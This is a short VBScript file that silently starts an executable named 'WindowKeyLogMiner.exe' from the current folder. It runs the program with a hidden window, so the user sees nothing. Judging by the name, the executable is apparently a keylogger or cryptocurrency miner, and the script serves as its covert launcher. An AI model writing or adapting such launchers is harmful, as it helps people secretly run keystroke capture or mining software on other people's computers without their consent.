Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.shell")
Dim fso: set fso = CreateObject("Scripting.FileSystemObject")
Dim CurrentDirectory
CurrentDirectory = fso.GetAbsolutePathName(".")
Dim Directory
Directory = fso.BuildPath(CurrentDirectory, "WindowKeyLogMiner.exe")
WinScriptHost.Run Chr(34) & Directory & Chr(34),0
Set WinScriptHost = Nothing